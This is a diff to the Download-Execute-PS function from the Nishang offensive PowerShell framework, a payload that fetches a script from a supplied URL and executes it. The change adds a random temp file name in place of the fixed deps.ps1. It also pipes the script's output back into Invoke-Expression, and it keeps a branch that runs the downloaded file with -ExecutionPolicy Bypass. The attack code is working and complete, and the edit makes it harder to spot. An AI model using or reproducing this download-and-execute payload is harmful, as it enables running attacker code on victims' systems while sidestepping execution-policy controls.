@@ -1,6 +1,5 @@
 
-function Download-Execute-PS
-{
+function Download-Execute-PS{
 <#
 .SYNOPSIS
 Nishang Payload which downloads and executes a powershell script.
@@ -41,24 +40,18 @@ https://github.com/samratashok/nishang
         [Switch]
         $nodownload
     )
-
-    if ($nodownload -eq $true)
-    {
+    if ($nodownload -eq $true){
         Invoke-Expression ((New-Object Net.WebClient).DownloadString("$ScriptURL"))
-        if($Arguments)
-        {
+        if($Arguments){
             Invoke-Expression $Arguments
         }
     }
-    
-    else
-    {
+    else{
+        $rand = Get-Random
         $webclient = New-Object System.Net.WebClient
-        $file1 = "$env:temp\deps.ps1"
+        $file1 = "$env:temp\$rand.ps1"
         $webclient.DownloadFile($ScriptURL,"$file1")
         $script:pastevalue = powershell.exe -ExecutionPolicy Bypass -noLogo -command $file1
-        $pastevalue
+        Invoke-Expression $pastevalue
     }
 }
-
-
